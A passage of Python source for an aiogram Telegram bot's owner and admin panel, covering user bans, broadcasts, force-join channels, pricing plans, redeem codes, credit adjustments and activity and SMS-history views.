        await cq.answer("🚫 Access denied!", show_alert=True); return
    parts = cq.data.split(":")
    prefix = parts[0]; page = int(parts[3])
    text, markup = users_list_kb(d, prefix, page)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

# ===== BAN / UNBAN =====
@R.callback_query(F.data.in_({"owner:ban", "admin:ban"}))
async def panel_ban_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access denied!", show_alert=True); return
    await state.set_state(S.ban_user)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await cq.message.edit_text(
        f"{em(EMOJI_CROSS,'🚫')} <b>Ban User</b>\n\nUser ID:",
        reply_markup=kb((sc("cancel"), back)), parse_mode="HTML")

@R.message(S.ban_user)
async def panel_ban_done(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear(); return
    try: ban_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Valid ID:", parse_mode="HTML"); return
    if is_owner(ban_id, d) or is_admin(ban_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Can't ban admins!", parse_mode="HTML"); return
    if ban_id not in d.get("banned", []):
        d.setdefault("banned", []).append(ban_id); save(d)
    await state.clear()
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(
        f"{em(EMOJI_CROSS,'🚫')} <b>Banned!</b>\n<code>{ban_id}</code>",
        reply_markup=back_kb, parse_mode="HTML")
    try:
        await msg.bot.send_message(ban_id,
            f"{em(EMOJI_CROSS,'🚫')} You have been banned.", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.in_({"owner:unban:menu", "admin:unban:menu"}))
async def panel_unban_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access denied!", show_alert=True); return
    if not d.get("banned"):
        await cq.answer("✅ None banned!", show_alert=True); return
    prefix = "owner" if is_owner(cq.from_user.id, d) else "admin"
    await cq.message.edit_text(
        f"{em(EMOJI_CHECK,'🔓')} <b>Unban User</b>\n\nBanned: <b>{len(d.get('banned', []))}</b>",
        reply_markup=unban_menu_kb(d, prefix), parse_mode="HTML")

@R.callback_query(F.data.regexp(r"^(owner|admin):unban:do:(\d+)$"))
async def panel_unban_do(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True); return
    ban_id = int(cq.data.split(":")[-1])
    if ban_id in d.get("banned", []):
        d["banned"].remove(ban_id); save(d)
    await cq.answer(f"✅ {ban_id} unbanned!", show_alert=True)
    text = owner_panel_text(d) if is_owner(uid, d) else admin_panel_text(d)
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await cq.message.edit_text(text, reply_markup=back_kb, parse_mode="HTML")
    try:
        await cq.bot.send_message(ban_id,
            f"{em(EMOJI_CHECK,'✅')} You're unbanned. /start", parse_mode="HTML")
    except: pass

# ===== BROADCAST =====
@R.callback_query(F.data.in_({"owner:broadcast", "admin:broadcast"}))
async def panel_broadcast_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access denied!", show_alert=True); return
    await state.set_state(S.broadcast)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await cq.message.edit_text(
        f"{em(EMOJI_BELL,'📢')} <b>Broadcast</b>\n\nType the message:",
        reply_markup=kb((sc("cancel"), back)), parse_mode="HTML")

@R.message(S.broadcast)
async def panel_broadcast_do(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear(); return
    await state.clear()
    users = d.get("users", {})
    wait = await msg.answer(
        f"{em(EMOJI_BELL,'📤')} Broadcasting to <b>{len(users)}</b> users...", parse_mode="HTML")
    ok = fail = 0
    for uid_str in users:
        try:
            target = int(uid_str)
            if msg.text:
                await msg.bot.send_message(target,
                    f"{em(EMOJI_BELL,'📢')} <b>Broadcast</b>\n\n{msg.text}", parse_mode="HTML")
            else:
                await msg.copy_to(target)
            ok += 1
        except: fail += 1
        await asyncio.sleep(0.05)
    await wait.delete()
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(
        f"{em(EMOJI_CHECK,'✅')} <b>Broadcast Done!</b>\n\n"
        f"✅ Delivered: <b>{ok}</b>\n❌ Failed: <b>{fail}</b>",
        reply_markup=back_kb, parse_mode="HTML")

# ===== EXPORT SCRIPT =====
@R.callback_query(F.data == "owner:export_script")
async def owner_export_script(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await cq.answer("📤 Exporting...")
    try:
        path = os.path.abspath(__file__)
        if not os.path.exists(path):
            path = _DATA_FILE.replace(".json", ".py")
            if not os.path.exists(path):
                path = "bot.py"
        await cq.message.reply_document(
            document=FSInputFile(path),
            caption=f"{em(EMOJI_GEAR,'📤')} <b>Script</b> — {_VERSION}",
            parse_mode="HTML")
    except Exception as e:
        await cq.answer(f"❌ Failed: {str(e)[:40]}", show_alert=True)

# ===== FORCE JOIN =====
@R.callback_query(F.data == "owner:fj:menu")
async def owner_fj_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    fj = d.get("force_join", {}); channels = fj.get("channels", [])
    status = f"{em(EMOJI_CHECK,'🟢')} ON" if fj.get("enabled") else f"{em(EMOJI_CROSS,'🔴')} OFF"
    text = f"{em(EMOJI_BELL,'🔗')} <b>Force Join</b>\n\nStatus: {status}\nChannels: <b>{len(channels)}</b>\n\n"
    for ch in channels:
        req = "✅ Required" if ch.get("required", True) else "❌ Optional"
        text += f"• {ch.get('title','Channel')} (<code>{ch['id']}</code>)\n  {req} | {ch['link']}\n\n"
    rows = [
        [btn("ᴀᴅᴅ ᴄʜᴀɴɴᴇʟ", "owner:fj:add", EMOJI_CHECK, "➕")],
        [btn("ʀᴇᴍᴏᴠᴇ ᴄʜᴀɴɴᴇʟ", "owner:fj:remove", EMOJI_CROSS, "🗑")],
        [InlineKeyboardButton(
            text="🟢 " + sc("enable") if not fj.get("enabled") else "🔴 " + sc("disable"),
            callback_data="owner:fj:toggle")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:fj:add")
async def owner_fj_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await state.set_state(S.fj_add_channel)
    await cq.message.edit_text(
        f"{em(EMOJI_BELL,'🔗')} <b>Add Force Join</b>\n\n"
        f"{sc('step 1/2')}: Channel numeric ID (<code>-100...</code>):",
        reply_markup=kb((sc("cancel"), "owner:fj:menu")), parse_mode="HTML")

@R.message(S.fj_add_channel)
async def owner_fj_add_channel(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try: ch_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Valid ID:", parse_mode="HTML"); return
    await state.update_data(fj_channel_id=ch_id)
    await state.set_state(S.fj_add_link)
    await msg.answer(
        f"{em(EMOJI_BELL,'🔗')} <b>{sc('step 2/2')}</b>\n\nInvite link:",
        reply_markup=kb((sc("cancel"), "owner:fj:menu")), parse_mode="HTML")

@R.message(S.fj_add_link)
async def owner_fj_add_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Valid link:", parse_mode="HTML"); return
    data = await state.get_data(); ch_id = str(data.get("fj_channel_id"))
    try:
        chat = await msg.bot.get_chat(int(ch_id)); title = chat.title or "Channel"
    except: title = "Channel"
    channels = d.setdefault("force_join", {}).setdefault("channels", [])
    channels = [c for c in channels if str(c["id"]) != ch_id]
    channels.append({"id": ch_id, "link": link, "title": title, "required": True})
    d["force_join"]["channels"] = channels; save(d); await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK,'✅')} <b>Added!</b>\n\n{em(EMOJI_BELL,'📢')} {title}\n🔗 {link}",
        reply_markup=kb((sc("back"), "owner:fj:menu")), parse_mode="HTML")

@R.callback_query(F.data == "owner:fj:remove")
async def owner_fj_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    channels = d.get("force_join", {}).get("channels", [])
    if not channels:
        await cq.answer("❌ None!", show_alert=True); return
    rows = [[btn(f"{ch.get('title','Channel')[:25]}", f"owner:fj:del:{ch['id']}", EMOJI_CROSS, "🗑")] for ch in channels]
    rows.append([btn("ʙᴀᴄᴋ", "owner:fj:menu", EMOJI_GEAR, "🔙")])
    await cq.message.edit_text(
        f"{em(EMOJI_CROSS,'🗑')} <b>Remove Channel</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:fj:del:"))
async def owner_fj_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    ch_id = cq.data.split("owner:fj:del:", 1)[1]
    channels = d.get("force_join", {}).get("channels", [])
    d["force_join"]["channels"] = [c for c in channels if str(c["id"]) != ch_id]
    save(d); await cq.answer("🗑 Removed!")
    await owner_fj_menu(cq, state)

@R.callback_query(F.data == "owner:fj:toggle")
async def owner_fj_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    fj = d.setdefault("force_join", {})
    fj["enabled"] = not fj.get("enabled", False); save(d)
    await cq.answer("✅ Toggled!", show_alert=True)
    await owner_fj_menu(cq, state)

# ===== PRICING =====
@R.callback_query(F.data == "owner:pricing:menu")
async def owner_pricing_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    plans = d.get("pricing", {}).get("plans", [])
    text = f"{em(EMOJI_MONEY,'💳')} <b>Pricing Plans</b>\n\nTotal: <b>{len(plans)}</b>\n\n"
    for i, plan in enumerate(plans, 1):
        text += (f"{i}. <b>{plan['name']}</b>\n"
                 f"   💰 {plan['price']} {plan.get('currency','INR')} = {plan['credits']} credits\n"
                 f"   🔗 {plan['payment_link']}\n\n")
    rows = [
        [btn("ᴀᴅᴅ ᴘʟᴀɴ", "owner:pricing:add", EMOJI_CHECK, "➕")],
        [btn("ʀᴇᴍᴏᴠᴇ ᴘʟᴀɴ", "owner:pricing:remove", EMOJI_CROSS, "🗑")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:pricing:add")
async def owner_pricing_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await state.set_state(S.add_plan_name)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY,'💳')} <b>Add Plan</b>\n\n{sc('step 1/4')}: Plan name:",
        reply_markup=kb((sc("cancel"), "owner:pricing:menu")), parse_mode="HTML")

@R.message(S.add_plan_name)
async def owner_pricing_name(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear(); return
    await state.update_data(plan_name=msg.text.strip()); await state.set_state(S.add_plan_price)
    await msg.answer(f"{em(EMOJI_MONEY,'💳')} {sc('step 2/4')}: Price:",
                     reply_markup=kb((sc("cancel"), "owner:pricing:menu")), parse_mode="HTML")

@R.message(S.add_plan_price)
async def owner_pricing_price(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear(); return
    try:
        price = float(msg.text.strip())
        await state.update_data(plan_price=price)
    except:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Valid price:", parse_mode="HTML"); return
    await state.set_state(S.add_plan_credits)
    await msg.answer(f"{em(EMOJI_MONEY,'💳')} {sc('step 3/4')}: Credits:",
                     reply_markup=kb((sc("cancel"), "owner:pricing:menu")), parse_mode="HTML")

@R.message(S.add_plan_credits)
async def owner_pricing_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear(); return
    try:
        credits = int(msg.text.strip())
        await state.update_data(plan_credits=credits)
    except:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Valid number:", parse_mode="HTML"); return
    await state.set_state(S.add_plan_link)
    await msg.answer(
        f"{em(EMOJI_MONEY,'💳')} {sc('step 4/4')}: Payment link:",
        reply_markup=kb((sc("cancel"), "owner:pricing:menu")), parse_mode="HTML")

@R.message(S.add_plan_link)
async def owner_pricing_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Valid URL:", parse_mode="HTML"); return
    data = await state.get_data()
    plan = {
        "id": str(int(time.time())),
        "name": data.get("plan_name", "Plan"),
        "price": data.get("plan_price", 0),
        "credits": data.get("plan_credits", 0),
        "currency": "INR",
        "payment_link": link
    }
    d.setdefault("pricing", {}).setdefault("plans", []).append(plan)
    save(d); await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK,'✅')} <b>Plan Added!</b>\n\n📋 {plan['name']}\n💰 {plan['price']} INR = {plan['credits']} credits\n🔗 {plan['payment_link']}",
        reply_markup=kb((sc("back"), "owner:pricing:menu")), parse_mode="HTML")

@R.callback_query(F.data == "owner:pricing:remove")
async def owner_pricing_remove(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        await cq.answer("❌ None!", show_alert=True); return
    rows = [[btn(p['name'][:25], f"owner:pricing:del:{p['id']}", EMOJI_CROSS, "🗑")] for p in plans]
    rows.append([btn("ʙᴀᴄᴋ", "owner:pricing:menu", EMOJI_GEAR, "🔙")])
    await cq.message.edit_text(
        f"{em(EMOJI_CROSS,'🗑')} <b>Remove Plan</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:pricing:del:"))
async def owner_pricing_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    plan_id = cq.data.split("owner:pricing:del:", 1)[1]
    plans = d.get("pricing", {}).get("plans", [])
    d["pricing"]["plans"] = [p for p in plans if p["id"] != plan_id]
    save(d); await cq.answer("🗑 Removed!")
    await owner_pricing_menu(cq, state)

# ===== REDEEM =====
@R.callback_query(F.data == "owner:redeem:menu")
async def owner_redeem_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    codes = d.get("redeem_codes", {})
    text = f"{em(EMOJI_GIFT,'🎁')} <b>Redeem Codes</b>\n\nTotal: <b>{len(codes)}</b>\n\n"
    for code, data in list(codes.items())[:10]:
        status = "✅ Active" if data.get("uses_left", 0) > 0 else "❌ Expired"
        text += f"<code>{code}</code> — 💰{data['credits']} — {status} ({data.get('uses_left', 0)} left)\n"
    rows = [
        [btn("ɢᴇɴᴇʀᴀᴛᴇ", "owner:redeem:gen", EMOJI_CHECK, "➕")],
        [btn("ᴅᴇʟᴇᴛᴇ", "owner:redeem:del", EMOJI_CROSS, "🗑")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:redeem:gen")
async def owner_redeem_gen_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await state.set_state(S.gen_redeem_credits)
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT,'🎁')} <b>Generate Code</b>\n\n{sc('step 1/2')}: Credits:",
        reply_markup=kb((sc("cancel"), "owner:redeem:menu")), parse_mode="HTML")

@R.message(S.gen_redeem_credits)
async def owner_redeem_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear(); return
    try:
        credits = int(msg.text.strip())
        await state.update_data(gen_credits=credits)
    except:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Valid number:", parse_mode="HTML"); return
    await state.set_state(S.gen_redeem_uses)
    await msg.answer(f"{em(EMOJI_GIFT,'🎁')} {sc('step 2/2')}: Max uses:",
                     reply_markup=kb((sc("cancel"), "owner:redeem:menu")), parse_mode="HTML")

@R.message(S.gen_redeem_uses)
async def owner_redeem_uses(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        uses = int(msg.text.strip())
        if uses < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Valid number (1+):", parse_mode="HTML"); return
    data = await state.get_data(); credits = data.get("gen_credits", 10)
    while True:
        code = "GIFT" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        if code not in d.get("redeem_codes", {}): break
    d.setdefault("redeem_codes", {})[code] = {
        "credits": credits, "uses_left": uses,
        "created_by": msg.from_user.id, "created_at": int(time.time()),
        "used_by": []
    }
    save(d); await state.clear()
    await msg.answer(
        f"{em(EMOJI_GIFT,'🎉')} <b>Code Generated!</b>\n\n"
        f"{em(EMOJI_GIFT,'🎁')} Code: <code>{code}</code>\n"
        f"{em(EMOJI_MONEY,'💰')} Credits: <b>{credits}</b>\n"
        f"{em(EMOJI_STAR,'🔢')} Max Uses: <b>{uses}</b>",
        reply_markup=kb((sc("back"), "owner:redeem:menu")), parse_mode="HTML")

@R.callback_query(F.data == "owner:redeem:del")
async def owner_redeem_del_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    codes = d.get("redeem_codes", {})
    if not codes:
        await cq.answer("❌ None!", show_alert=True); return
    rows = [[btn(code, f"owner:redeem:deldo:{code}", EMOJI_CROSS, "🗑")] for code in list(codes.keys())[:20]]
    rows.append([btn("ʙᴀᴄᴋ", "owner:redeem:menu", EMOJI_GEAR, "🔙")])
    await cq.message.edit_text(
        f"{em(EMOJI_CROSS,'🗑')} <b>Delete Code</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:redeem:deldo:"))
async def owner_redeem_del_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    code = cq.data.split("owner:redeem:deldo:", 1)[1]
    if code in d.get("redeem_codes", {}):
        del d["redeem_codes"][code]; save(d)
    await cq.answer("🗑 Deleted!")
    await owner_redeem_menu(cq, state)

# ===== CREDITS ADD/DEDUCT =====
@R.callback_query(F.data == "owner:credits:add")
async def owner_credits_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await state.set_state(S.add_credits_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY,'💰')} <b>Add Credits</b>\n\n{sc('step 1/2')}: User ID:",
        reply_markup=kb((sc("cancel"), "owner:home")), parse_mode="HTML")

@R.message(S.add_credits_uid)
async def owner_credits_add_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear(); return
    try:
        uid = int(msg.text.strip())
        await state.update_data(credit_uid=uid)
    except:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Valid ID:", parse_mode="HTML"); return
    await state.set_state(S.add_credits_amount)
    await msg.answer(f"{em(EMOJI_MONEY,'💰')} {sc('step 2/2')}: Amount:",
                     reply_markup=kb((sc("cancel"), "owner:home")), parse_mode="HTML")

@R.message(S.add_credits_amount)
async def owner_credits_add_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        amt = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Valid number:", parse_mode="HTML"); return
    data = await state.get_data(); uid = data.get("credit_uid")
    add_credits(uid, amt, d); save(d); await state.clear()
    try:
        await msg.bot.send_message(uid,
            f"{em(EMOJI_MONEY,'💰')} <b>Credits Added!</b>\n\n+{amt} credits\n💳 Balance: <b>{get_user_credits(uid, d)}</b>",
            parse_mode="HTML")
    except: pass
    await msg.answer(
        f"{em(EMOJI_CHECK,'✅')} <b>{amt} credits</b> added to <code>{uid}</code>!\n💳 Balance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb((sc("back"), "owner:home")), parse_mode="HTML")

@R.callback_query(F.data == "owner:credits:deduct")
async def owner_credits_deduct_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await state.set_state(S.deduct_credits_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY,'💰')} <b>Deduct Credits</b>\n\n{sc('step 1/2')}: User ID:",
        reply_markup=kb((sc("cancel"), "owner:home")), parse_mode="HTML")

@R.message(S.deduct_credits_uid)
async def owner_credits_deduct_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear(); return
    try:
        uid = int(msg.text.strip())
        await state.update_data(deduct_uid=uid)
    except:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Valid ID:", parse_mode="HTML"); return
    await state.set_state(S.deduct_credits_amount)
    await msg.answer(f"{em(EMOJI_MONEY,'💰')} {sc('step 2/2')}: Amount:",
                     reply_markup=kb((sc("cancel"), "owner:home")), parse_mode="HTML")

@R.message(S.deduct_credits_amount)
async def owner_credits_deduct_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        amt = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Valid number:", parse_mode="HTML"); return
    data = await state.get_data(); uid = data.get("deduct_uid")
    ok = deduct_credits(uid, amt, d); save(d); await state.clear()
    if ok:
        try:
            await msg.bot.send_message(uid,
                f"{em(EMOJI_WARNING,'⚠️')} <b>Credits Deducted</b>\n\n-{amt}\n💳 Balance: <b>{get_user_credits(uid, d)}</b>",
                parse_mode="HTML")
        except: pass
        await msg.answer(
            f"{em(EMOJI_CHECK,'✅')} <b>{amt} deducted</b> from <code>{uid}</code>!\n💳 Balance: <b>{get_user_credits(uid, d)}</b>",
            reply_markup=kb((sc("back"), "owner:home")), parse_mode="HTML")
    else:
        await msg.answer(
            f"{em(EMOJI_CROSS,'❌')} Insufficient! User has <b>{get_user_credits(uid, d)}</b> credits.",
            reply_markup=kb((sc("back"), "owner:home")), parse_mode="HTML")

# ===== SETTINGS =====
@R.callback_query(F.data == "owner:settings")
async def owner_settings(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    s = d.get("settings", {})
    text = (
        f"{em(EMOJI_GEAR,'⚙️')} <b>Settings</b>\n\n"
        f"{em(EMOJI_GIFT,'🎁')} Referral Credits: <b>{s.get('ref_credits',3)}</b>\n"
        f"{em(EMOJI_CROWN,'👑')} Max Owners: <b>{s.get('max_owners',6)}</b>\n"
    )
    rows = [
        [btn("sᴇᴛ ʀᴇғ ᴄʀᴇᴅɪᴛs", "owner:settings:ref", EMOJI_GIFT, "🎁")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:settings:ref")
async def owner_settings_ref(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await state.set_state(S.set_ref_credits)
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT,'🎁')} <b>Referral Credits</b>\n\nNew amount:",
        reply_markup=kb((sc("cancel"), "owner:settings")), parse_mode="HTML")

@R.message(S.set_ref_credits)
async def owner_settings_ref_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        credits = int(msg.text.strip())
        if credits < 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Valid positive number:", parse_mode="HTML"); return
    d.setdefault("settings", {})["ref_credits"] = credits
    d["premium"]["ref_credits"] = credits
    save(d); await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK,'✅')} <b>Updated!</b>\n\nRef credits: <b>{credits}</b>",
        reply_markup=kb((sc("back"), "owner:settings")), parse_mode="HTML")

# ===== ACTIVITY / HISTORY =====
@R.callback_query(F.data == "owner:activity")
async def owner_activity_log(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    entries = d.get("activity_log", [])[-20:]
    if not entries:
        text = f"{em(EMOJI_GEAR,'📜')} <b>Activity Log</b>\n\n<i>Empty.</i>"
    else:
        lines = [f"{em(EMOJI_GEAR,'📜')} <b>Recent Activity</b>\n"]
        for e in reversed(entries):
            lines.append(f"[{fmt_time(e.get('timestamp',0))}] <code>{e.get('uid',0)}</code> — <b>{e.get('action','?')}</b> — {e.get('details','')}")
        text = "\n".join(lines)
    await cq.message.edit_text(text,
        reply_markup=kb((sc("refresh"), "owner:activity"), (sc("back"), "owner:home")),
        parse_mode="HTML")

@R.callback_query(F.data == "owner:sms_history")
async def owner_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    hist = d.get("sms_history", {})
    total = sum(len(v) for v in hist.values())
    text = (f"{em(EMOJI_STAR,'📋')} <b>Global SMS History</b>\n\n"
            f"Total Records: <b>{total}</b>\n\n"
            f"<i>Per-user history in their Stats.</i>")
    await cq.message.edit_text(text,
        reply_markup=kb((sc("back"), "owner:home")), parse_mode="HTML")

# ===== USER HOME / MISC =====
@R.callback_query(F.data.in_({"user:home", "user:cancel"}))
async def user_home(cq: CallbackQuery, state: FSMContext):
    await state.clear(); d = load(); uid = cq.from_user.id
    ok, missing = await user_joined_all(cq.bot, uid, d)
    if not ok:
        await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing),
                                   parse_mode="HTML", disable_web_page_preview=True); return
    if is_owner(uid, d):
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML"); return
    if is_admin(uid, d):
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML"); return
    if not can_use(uid, d):
        await cq.message.edit_text(f"{em(EMOJI_CROSS,'⛔')} No access.", parse_mode="HTML"); return
    await cq.message.edit_text(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "user:credits")
async def user_credits(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    await cq.answer(f"💰 Credits: {get_user_credits(uid, d)}\nDev: {SUPER_ADMIN_NAME}", show_alert=True)

@R.callback_query(F.data == "user:redeem")
async def user_redeem_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.redeem_code)
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT,'🎁')} <b>Redeem</b>\n\nEnter code:",
        reply_markup=kb((sc("cancel"), "user:home")), parse_mode="HTML")

@R.message(S.redeem_code)
async def user_redeem_done(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    code = msg.text.strip().upper(); await state.clear()
    codes = d.get("redeem_codes", {})
    if code not in codes:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Invalid code!",
                         reply_markup=kb((sc("home"), "user:home")), parse_mode="HTML"); return
    cd = codes[code]
    if cd.get("uses_left", 0) <= 0:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Expired!",
                         reply_markup=kb((sc("home"), "user:home")), parse_mode="HTML"); return
    if uid in cd.get("used_by", []):
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Already used!",
                         reply_markup=kb((sc("home"), "user:home")), parse_mode="HTML"); return
    credits = cd["credits"]
    add_credits(uid, credits, d)
    cd["uses_left"] = cd.get("uses_left", 1) - 1
    cd.setdefault("used_by", []).append(uid)
    save(d)
    await msg.answer(
        f"{em(EMOJI_GIFT,'🎉')} <b>Redeemed!</b>\n\n💰 +{credits} credits\n💳 Balance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb((sc("home"), "user:home")), parse_mode="HTML")

@R.callback_query(F.data == "user:refer")
async def user_refer(cq: CallbackQuery, state: FSMContext):
